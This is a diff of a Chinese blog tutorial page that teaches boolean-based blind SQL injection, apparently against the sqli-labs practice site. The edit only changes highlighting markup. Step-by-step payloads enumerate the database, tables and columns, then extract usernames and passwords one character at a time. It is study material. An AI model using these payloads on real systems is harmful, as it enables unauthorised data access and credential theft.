@@ -265,82 +265,82 @@
         <h1 id="基于布尔的盲注"><a href="#基于布尔的盲注" class="headerlink" title="基于布尔的盲注"></a>基于布尔的盲注</h1><hr>
 <a id="more"></a>
 
-<h1 id="常用函数"><a href="#常用函数" class="headerlink" title="常用函数"></a>常用函数</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">length() 返回字符串的长度</span><br><span class="line">substr() 截取字符串</span><br><span class="line">ascii() 以ascii码形式转换</span><br><span class="line">limit 0,1 从你的表中的第0个数据开始，只读取一个</span><br><span class="line">COUNT(*) 函数返回在给定的选择中被选的行数</span><br></pre></td></tr></table></figure>
+<h1 id="常用函数"><a href="#常用函数" class="headerlink" title="常用函数"></a>常用函数</h1><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="title">length</span><span class="params">()</span></span> 返回字符串的长度</span><br><span class="line"><span class="function"><span class="title">substr</span><span class="params">()</span></span> 截取字符串</span><br><span class="line"><span class="function"><span class="title">ascii</span><span class="params">()</span></span> 以ascii码形式转换</span><br><span class="line">limit <span class="number">0</span>,<span class="number">1</span> 从你的表中的第<span class="number">0</span>个数据开始，只读取一个</span><br><span class="line"><span class="function"><span class="title">COUNT</span><span class="params">(*)</span></span> 函数返回在给定的选择中被选的行数</span><br></pre></td></tr></table></figure>
 
 <p><img src="/images/%E5%9F%BA%E4%BA%8E%E5%B8%83%E5%B0%94%E7%9A%84%E7%9B%B2%E6%B3%A8/1.jpg" alt></p>
 <hr>
-<h1 id="查询数据库长度"><a href="#查询数据库长度" class="headerlink" title="查询数据库长度"></a>查询数据库长度</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&apos; and length(database())=8--+</span><br></pre></td></tr></table></figure>
+<h1 id="查询数据库长度"><a href="#查询数据库长度" class="headerlink" title="查询数据库长度"></a>查询数据库长度</h1><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?<span class="built_in">id</span>=<span class="number">1</span>' <span class="keyword">and</span> <span class="built_in">length</span>(database())=<span class="number">8</span><span class="comment">--+</span></span><br></pre></td></tr></table></figure>
 
 <p>length()查询数据库长度是不是为8个字节长度，正确网页回显，得知数据库为8个长度</p>
 <p><img src="/images/%E5%9F%BA%E4%BA%8E%E5%B8%83%E5%B0%94%E7%9A%84%E7%9B%B2%E6%B3%A8/2.jpg" alt></p>
 <hr>
-<h1 id="获取数据库名称"><a href="#获取数据库名称" class="headerlink" title="获取数据库名称"></a>获取数据库名称</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?id=1&apos; and ascii(substr(database(),1,1))=115--+</span><br><span class="line">?id=1&apos; and (select ascii(substr(database(),1,1)))=115--+</span><br></pre></td></tr></table></figure>
+<h1 id="获取数据库名称"><a href="#获取数据库名称" class="headerlink" title="获取数据库名称"></a>获取数据库名称</h1><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?id=<span class="number">1</span>' and ascii(substr(database(),<span class="number">1</span>,<span class="number">1</span>))=<span class="number">115</span>--+</span><br><span class="line">?id=<span class="number">1</span>' and (select ascii(substr(database(),<span class="number">1</span>,<span class="number">1</span>)))=<span class="number">115</span>--+</span><br></pre></td></tr></table></figure>
 
 <p><code>用人话来解释:用substr函数截取数据库从第1个数据开始，截取1个字节，并用ascii码的形式转换</code></p>
 <p>第一个 ‘1’ 是为从数据库名字的第一位开始，第二个 ‘1’ 是为截取一个字节长度；最后进行比较是否为十进制的 ‘s’</p>
 <p><img src="/images/%E5%9F%BA%E4%BA%8E%E5%B8%83%E5%B0%94%E7%9A%84%E7%9B%B2%E6%B3%A8/3.jpg" alt></p>
 <p>以此类推，我要查询数据库第2个字节是否为 ‘e’ ,payload如下:</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?id=1&apos; and ascii(substr(database(),2,1))=101--+</span><br><span class="line">?id=1&apos; and (select ascii(substr(database(),2,1)))=101--+</span><br></pre></td></tr></table></figure>
+<figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?id=<span class="number">1</span>' and ascii(substr(database(),<span class="number">2</span>,<span class="number">1</span>))=<span class="number">101</span>--+</span><br><span class="line">?id=<span class="number">1</span>' and (select ascii(substr(database(),<span class="number">2</span>,<span class="number">1</span>)))=<span class="number">101</span>--+</span><br></pre></td></tr></table></figure>
 
 <p>‘2’ 是为从数据库名字的第二位开始即为 ‘e’ , ‘1’ 是为截取一个长度 ; 最后进行比较.</p>
 <hr>
 <h1 id="查询有几张表"><a href="#查询有几张表" class="headerlink" title="查询有几张表"></a>查询有几张表</h1><p>上面的步骤得知数据库为 <code>security</code>，继续操作。。。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&apos; and (select COUNT(*) from information_schema.tables where table_schema=database())=4--+</span><br></pre></td></tr></table></figure>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?<span class="attribute">id</span>=1' <span class="keyword">and</span> (select COUNT(*) <span class="keyword">from</span> information_schema.tables where <span class="attribute">table_schema</span>=database())=4--+</span><br></pre></td></tr></table></figure>
 
 <p><code>用人话来解释:用COUNT(*)查询数据库里面是否有4张表，如果正确网页回显</code></p>
 <p><img src="/images/%E5%9F%BA%E4%BA%8E%E5%B8%83%E5%B0%94%E7%9A%84%E7%9B%B2%E6%B3%A8/4.jpg" alt></p>
 <hr>
 <h1 id="查询每张表的长度"><a href="#查询每张表的长度" class="headerlink" title="查询每张表的长度"></a>查询每张表的长度</h1><p><img src="/images/%E5%9F%BA%E4%BA%8E%E5%B8%83%E5%B0%94%E7%9A%84%E7%9B%B2%E6%B3%A8/5.jpg" alt></p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&apos; and (select length(table_name) from information_schema.tables where table_schema=database() limit 0,1)=6--+</span><br></pre></td></tr></table></figure>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1' and (<span class="keyword">select</span> <span class="keyword">length</span>(table_name) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=<span class="keyword">database</span>() <span class="keyword">limit</span> <span class="number">0</span>,<span class="number">1</span>)=<span class="number">6</span><span class="comment">--+</span></span><br></pre></td></tr></table></figure>
 
 <p><code>用人话来解释:从securiity数据库中的第0张表开始查询是否字节长度为6，limit从0开始排序</code></p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&apos; and (select length(table_name) from information_schema.tables where table_schema=database() limit 1,1)=8--+</span><br></pre></td></tr></table></figure>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1' and (<span class="keyword">select</span> <span class="keyword">length</span>(table_name) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=<span class="keyword">database</span>() <span class="keyword">limit</span> <span class="number">1</span>,<span class="number">1</span>)=<span class="number">8</span><span class="comment">--+</span></span><br></pre></td></tr></table></figure>
 
 <p><code>查询数据库中的第一张表的字节是否为8</code></p>
 <hr>
 <h1 id="获取表的名称"><a href="#获取表的名称" class="headerlink" title="获取表的名称"></a>获取表的名称</h1><p><strong>查询emails表</strong></p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&apos; and (select ascii(substr(table_name,1,1)) from information_schema.tables where table_schema=database() limit 0,1)=101--+</span><br></pre></td></tr></table></figure>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1' and (<span class="keyword">select</span> <span class="keyword">ascii</span>(<span class="keyword">substr</span>(table_name,<span class="number">1</span>,<span class="number">1</span>)) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=<span class="keyword">database</span>() <span class="keyword">limit</span> <span class="number">0</span>,<span class="number">1</span>)=<span class="number">101</span><span class="comment">--+</span></span><br></pre></td></tr></table></figure>
 
 <p><code>用人话来解释:每次从第0张表的第一个位置截取一个字节用ascii码转换来进行比较，正确则网页回显</code></p>
 <p><img src="/images/%E5%9F%BA%E4%BA%8E%E5%B8%83%E5%B0%94%E7%9A%84%E7%9B%B2%E6%B3%A8/6.jpg" alt></p>
 <p><strong>查询referers表</strong></p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&apos; and (select ascii(substr(table_name,1,1)) from information_schema.tables where table_schema=database() limit 1,1)=114--+</span><br></pre></td></tr></table></figure>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1' and (<span class="keyword">select</span> <span class="keyword">ascii</span>(<span class="keyword">substr</span>(table_name,<span class="number">1</span>,<span class="number">1</span>)) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=<span class="keyword">database</span>() <span class="keyword">limit</span> <span class="number">1</span>,<span class="number">1</span>)=<span class="number">114</span><span class="comment">--+</span></span><br></pre></td></tr></table></figure>
 
 <p><code>用人话来解释:，每次从第1张表中的第一个位置截取一个字节用ascii转换进行比较，正确则回显</code></p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&apos; and (select ascii(substr(table_name,2,1)) from information_schema.tables where table_schema=database() limit 1,1)=101--+</span><br></pre></td></tr></table></figure>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1' and (<span class="keyword">select</span> <span class="keyword">ascii</span>(<span class="keyword">substr</span>(table_name,<span class="number">2</span>,<span class="number">1</span>)) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=<span class="keyword">database</span>() <span class="keyword">limit</span> <span class="number">1</span>,<span class="number">1</span>)=<span class="number">101</span><span class="comment">--+</span></span><br></pre></td></tr></table></figure>
 
 <p><code>用人话来解释:，每次从第1张表中的第二个位置截取一个字节用ascii转换进行比较，正确则回显</code></p>
 <p>以此类推。。。。。</p>
 <hr>
 <h1 id="查询表下面有多少列"><a href="#查询表下面有多少列" class="headerlink" title="查询表下面有多少列"></a>查询表下面有多少列</h1><p>由上得知security数据库下的所有表名，继续操作。。。。</p>
 <p><img src="/images/%E5%9F%BA%E4%BA%8E%E5%B8%83%E5%B0%94%E7%9A%84%E7%9B%B2%E6%B3%A8/7.jpg" alt></p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&apos; and (select COUNT(*) from information_schema.columns where table_name=&apos;users&apos;)=3--+</span><br></pre></td></tr></table></figure>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?<span class="attribute">id</span>=1' <span class="keyword">and</span> (select COUNT(*) <span class="keyword">from</span> information_schema.columns where <span class="attribute">table_name</span>=<span class="string">'users'</span>)=3--+</span><br></pre></td></tr></table></figure>
 
 <p><code>用人话来解释:COUNT(*)函数查询users表下是否有3个列，正确网页回显</code></p>
 <hr>
 <h1 id="查询每张表下列的长度"><a href="#查询每张表下列的长度" class="headerlink" title="查询每张表下列的长度"></a>查询每张表下列的长度</h1><p><img src="/images/%E5%9F%BA%E4%BA%8E%E5%B8%83%E5%B0%94%E7%9A%84%E7%9B%B2%E6%B3%A8/8.jpg" alt></p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&apos; and (select length(column_name) from information_schema.columns where table_name=&apos;users&apos; limit 0,1)=2--+</span><br></pre></td></tr></table></figure>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1' and (<span class="keyword">select</span> <span class="keyword">length</span>(column_name) <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name=<span class="string">'users'</span> <span class="keyword">limit</span> <span class="number">0</span>,<span class="number">1</span>)=<span class="number">2</span><span class="comment">--+</span></span><br></pre></td></tr></table></figure>
 
 <p><code>用人话来解释:每次查询users表下的第0个列的长度是多少，如果比较正确，网页回显</code></p>
 <hr>
 <h1 id="获取表下列的名称"><a href="#获取表下列的名称" class="headerlink" title="获取表下列的名称"></a>获取表下列的名称</h1><p><img src="/images/%E5%9F%BA%E4%BA%8E%E5%B8%83%E5%B0%94%E7%9A%84%E7%9B%B2%E6%B3%A8/9.jpg" alt></p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&apos; and (select ascii(substr(column_name,1,1)) from information_schema.columns where table_name=&apos;users&apos; limit 0,1)=105--+</span><br></pre></td></tr></table></figure>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1' and (<span class="keyword">select</span> <span class="keyword">ascii</span>(<span class="keyword">substr</span>(column_name,<span class="number">1</span>,<span class="number">1</span>)) <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name=<span class="string">'users'</span> <span class="keyword">limit</span> <span class="number">0</span>,<span class="number">1</span>)=<span class="number">105</span><span class="comment">--+</span></span><br></pre></td></tr></table></figure>
 
 <p><code>用人话来解释:每次从users表下第0个列中的第一个数据截取一个字节用ascii码转换进行比较，正确就回显</code></p>
 <p><img src="/images/%E5%9F%BA%E4%BA%8E%E5%B8%83%E5%B0%94%E7%9A%84%E7%9B%B2%E6%B3%A8/10.jpg" alt></p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&apos; and (select ascii(substr(column_name,1,1)) from information_schema.columns where table_name=&apos;users&apos; limit 1,1)=117--+</span><br></pre></td></tr></table></figure>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1' and (<span class="keyword">select</span> <span class="keyword">ascii</span>(<span class="keyword">substr</span>(column_name,<span class="number">1</span>,<span class="number">1</span>)) <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name=<span class="string">'users'</span> <span class="keyword">limit</span> <span class="number">1</span>,<span class="number">1</span>)=<span class="number">117</span><span class="comment">--+</span></span><br></pre></td></tr></table></figure>
 
 <p><code>用人话来解释:每次从users表下第1个列中的第一个数据截取一个字节用ascii码转换进行比较，正确就回显</code></p>
 <p>以此类推。。。。。。。。</p>
 <hr>
 <h1 id="获取数据"><a href="#获取数据" class="headerlink" title="获取数据"></a>获取数据</h1><p><img src="/images/%E5%9F%BA%E4%BA%8E%E5%B8%83%E5%B0%94%E7%9A%84%E7%9B%B2%E6%B3%A8/7.jpg" alt></p>
 <p>查询<code>users表</code>下<code>username列</code>的数据</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&apos; and (select ascii(substr(username,1,1)) from security.users limit 0,1)=68--+</span><br></pre></td></tr></table></figure>
+<figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=<span class="number">1</span>' and (select ascii(substr(username,<span class="number">1</span>,<span class="number">1</span>)) from security.users limit <span class="number">0</span>,<span class="number">1</span>)=<span class="number">68</span>--+</span><br></pre></td></tr></table></figure>
 
 <p><img src="/images/%E5%9F%BA%E4%BA%8E%E5%B8%83%E5%B0%94%E7%9A%84%E7%9B%B2%E6%B3%A8/11.jpg" alt></p>
 <p><code>用人话来解释:每次查询security数据库中的users表下的username列的第一个数据截取一个数据并用ascii码转换十进制进行比较，若正确网页回显</code></p>
 <p>查询<code>users表</code> 下 <code>password列</code> 的数据</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&apos; and (select ascii(substr(password,1,1)) from security.users limit 0,1)=68--+</span><br></pre></td></tr></table></figure>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1' and (<span class="keyword">select</span> <span class="keyword">ascii</span>(<span class="keyword">substr</span>(<span class="keyword">password</span>,<span class="number">1</span>,<span class="number">1</span>)) <span class="keyword">from</span> security.users <span class="keyword">limit</span> <span class="number">0</span>,<span class="number">1</span>)=<span class="number">68</span><span class="comment">--+</span></span><br></pre></td></tr></table></figure>
 
 <p><img src="/images/%E5%9F%BA%E4%BA%8E%E5%B8%83%E5%B0%94%E7%9A%84%E7%9B%B2%E6%B3%A8/12.jpg" alt></p>
 <p><code>用人话来解释:每次查询security数据库中的users表下的password列的第一个数据截取一个数据并用ascii码转换十进制进行比较，若正确网页回显</code></p>
